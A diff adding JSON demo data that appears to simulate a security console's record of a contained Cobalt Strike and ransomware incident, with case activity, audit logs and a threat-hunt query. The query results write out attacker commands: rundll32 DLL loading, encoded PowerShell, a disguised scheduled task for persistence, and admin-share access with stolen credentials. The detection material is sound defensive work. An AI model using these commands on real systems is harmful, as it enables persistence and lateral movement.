+      {
+        "userName": "Sophos MDR Team",
+        "action": "C2 beacon identified: rundll32.exe connecting to 185.220.101.47:443 (Cobalt Strike infrastructure). Monitoring lateral movement.",
+        "category": "caseActivity",
+        "createdAt": "-7h"
+      },
+      {
+        "userName": "Sophos MDR Team",
+        "action": "Lateral movement attempt blocked: DESKTOP-FIN042 \u2192 SRV-FS01 via SMB using svc-backup credentials. File server protected.",
+        "category": "caseActivity",
+        "createdAt": "-6h"
+      },
+      {
+        "userName": "Sophos MDR Team",
+        "action": "DESKTOP-FIN042 isolated from network. CryptoGuard blocked ransomware encryption \u2014 127 files protected.",
+        "category": "caseActivity",
+        "createdAt": "-6h"
+      },
+      {
+        "userName": "Sophos MDR Team",
+        "action": "Firewall rule deployed: outbound traffic to 185.220.101.47 blocked across all network zones.",
+        "category": "caseActivity",
+        "createdAt": "-5h"
+      },
+      {
+        "userName": "Sophos MDR Team",
+        "action": "Compromised credentials identified and flagged for reset: svc-backup (service account used for lateral movement).",
+        "category": "caseActivity",
+        "createdAt": "-5h"
+      },
+      {
+        "userName": "Sophos MDR Team",
+        "action": "Remediation complete: Malicious files removed (Q1_Budget_Review.xlsm, msupdate.dll, beacon payload). Scheduled task persistence cleared. Registry modifications reverted.",
+        "category": "caseActivity",
+        "createdAt": "-4h"
+      },
+      {
+        "userName": "Sophos MDR Team",
+        "action": "Incident report generated and delivered to customer. DESKTOP-FIN042 cleared for reconnection pending customer approval. Recommended actions: reset svc-backup password, review email security policies, enable MFA on service accounts.",
+        "category": "caseActivity",
+        "createdAt": "-3h"
+      }
+    ]
+  },
+  "threatGraphs": {
+    "stacCases": {
+      "summary": {
+        "closed": 1,
+        "inprogress": 0,
+        "total": 1,
+        "new": 0
+      },
+      "items": [
+        {
+          "endpointType": "computer",
+          "endpointName": "DESKTOP-FIN042",
+          "username": "{{customerDomain}}\\sarah.chen",
+          "rootCauseName": "Q1_Budget_Review.xlsm",
+          "malwareName": "Cobalt Strike / Ransomware",
+          "cloudCreatedAt": "-7h",
+          "rootCauseDT": "-8h",
+          "status": "closed",
+          "priority": "HIGH",
+          "id": "auto",
+          "caseType": "SYSTEM_GENERATED",
+          "suspectProcessCount": 6,
+          "numberOfBusinessFiles": "127",
+          "isBehavioral": false,
+          "hasProcessBeacon": true
+        }
+      ],
+      "total": 1,
+      "filtered": 1,
+      "nextKey": null
+    }
+  },
+  "billing": {
+    "overrideName": "{{customerName}}",
+    "overrideAlias": "{{customerName}}"
+  },
+  "user": {
+    "overrideCompany": "{{customerName}}",
+    "overrideAlias": "{{customerName}}"
+  },
+  "healthScore": {
+    "override": 76
+  },
+  "auditLogs": {
+    "mode": "prepend",
+    "items": [
+      {
+        "timestamp": "-6h",
+        "type": "admin_action",
+        "category": "endpoint",
+        "action": "Device isolated from network",
+        "actor": "Sophos MDR Team",
+        "actorType": "admin",
+        "target": "DESKTOP-FIN042",
+        "targetType": "endpoint",
+        "result": "success",
+        "description": "MDR team isolated DESKTOP-FIN042 at 2:47 AM \u2014 8 minutes after CryptoGuard alert. Network access revoked."
+      },
+      {
+        "timestamp": "-6h",
+        "type": "admin_action",
+        "category": "endpoint",
+        "action": "Lateral movement blocked",
+        "actor": "Sophos MDR Team",
+        "actorType": "admin",
+        "target": "SRV-FS01",
+        "targetType": "endpoint",
+        "result": "blocked",
+        "description": "MDR team blocked SMB connection from DESKTOP-FIN042 to SRV-FS01 using stolen svc-backup credentials. File server protected."
+      },
+      {
+        "timestamp": "-5h",
+        "type": "admin_action",
+        "category": "firewall",
+        "action": "Firewall rule created",
+        "actor": "Sophos MDR Team",
+        "actorType": "admin",
+        "target": "185.220.101.47",
+        "targetType": "network",
+        "result": "success",
+        "description": "Outbound traffic to C2 server 185.220.101.47 blocked across all firewall zones."
+      },
+      {
+        "timestamp": "-5h",
+        "type": "admin_action",
+        "category": "security",
+        "action": "Credentials flagged for reset",
+        "actor": "Sophos MDR Team",
+        "actorType": "admin",
+        "target": "svc-backup",
+        "targetType": "user",
+        "result": "success",
+        "description": "Service account svc-backup flagged for immediate password reset \u2014 used by attacker for lateral movement."
+      },
+      {
+        "timestamp": "-4h",
+        "type": "admin_action",
+        "category": "endpoint",
+        "action": "Full remediation completed",
+        "actor": "Sophos MDR Team",
+        "actorType": "admin",
+        "target": "DESKTOP-FIN042",
+        "targetType": "endpoint",
+        "result": "success",
+        "description": "Remediation complete: 3 malicious files removed, scheduled task persistence cleared, registry modifications reverted. Device cleared for reconnection."
+      },
+      {
+        "timestamp": "-3h",
+        "type": "admin_action",
+        "category": "reporting",
+        "action": "Incident report delivered",
+        "actor": "Sophos MDR Team",
+        "actorType": "admin",
+        "target": "{{customerName}} Security Team",
+        "targetType": "user",
+        "result": "success",
+        "description": "Full incident report delivered to customer including: timeline, IOCs, impacted assets, remediation actions taken, and recommended follow-up actions."
+      }
+    ]
+  },
+  "liveDiscover": {
+    "queryResults": {
+      "id": "auto",
+      "status": "completed",
+      "query": "SELECT p.pid, p.name, p.path, p.cmdline, p.parent, pp.name AS parent_name FROM processes p LEFT JOIN processes pp ON p.parent = pp.pid WHERE p.cmdline LIKE '%rundll32%' OR p.cmdline LIKE '%beacon%' OR p.cmdline LIKE '%185.220.101%' OR p.cmdline LIKE '%vssadmin%' OR p.cmdline LIKE '%shadow%' OR p.name = 'schtasks.exe'",
+      "queryName": "MDR Threat Hunt \u2014 Cobalt Strike & Ransomware IOCs",
+      "startedAt": "-5h",
+      "completedAt": "-5h",
+      "endpointsQueried": 15,
+      "endpointsResponded": 15,
+      "totalResults": 5,
+      "columns": [
+        {
+          "name": "pid",
+          "type": "INTEGER"
+        },
+        {
+          "name": "name",
+          "type": "TEXT"
+        },
+        {
+          "name": "cmdline",
+          "type": "TEXT"
+        },
+        {
+          "name": "parent_name",
+          "type": "TEXT"
+        },
+        {
+          "name": "endpoint_hostname",
+          "type": "TEXT"
+        }
+      ],
+      "rows": [
+        [
+          4420,
+          "EXCEL.EXE",
+          "EXCEL.EXE /e \"C:\\Users\\sarah.chen\\Downloads\\Q1_Budget_Review.xlsm\"",
+          "outlook.exe",
+          "DESKTOP-FIN042"
+        ],
+        [
+          5812,
+          "rundll32.exe",
+          "rundll32.exe C:\\Users\\sarah.chen\\AppData\\Local\\Temp\\msupdate.dll,DllRegisterServer",
+          "powershell.exe",
+          "DESKTOP-FIN042"
+        ],
+        [
+          6204,
+          "powershell.exe",
+          "powershell.exe -ExecutionPolicy Bypass -enc SQBFAF...[truncated]",
+          "rundll32.exe",
+          "DESKTOP-FIN042"
+        ],
+        [
+          7100,
+          "schtasks.exe",
+          "schtasks.exe /create /tn \"Windows Update Check\" /tr \"rundll32.exe msupdate.dll\" /sc onlogon",
+          "cmd.exe",
+          "DESKTOP-FIN042"
+        ],
+        [
+          8440,
+          "net.exe",
+          "net.exe use \\\\SRV-FS01\\admin$ /user:{{customerDomain}}\\svc-backup [REDACTED]",
+          "cmd.exe",
+          "DESKTOP-FIN042"
+        ]
+      ]
+    }
+  },
+  "endpointReport": {
+    "overrideTotal": "{{endpointCount}}",
+    "overrideSummary": {
+      "total": "{{endpointCount}}",
+      "active": "{{endpointCount * 0.88}}",
+      "unprotected": 1,
+      "inactive": "{{endpointCount * 0.04}}",
+      "dormant": "{{endpointCount * 0.08}}"
+    }
+  }
+}
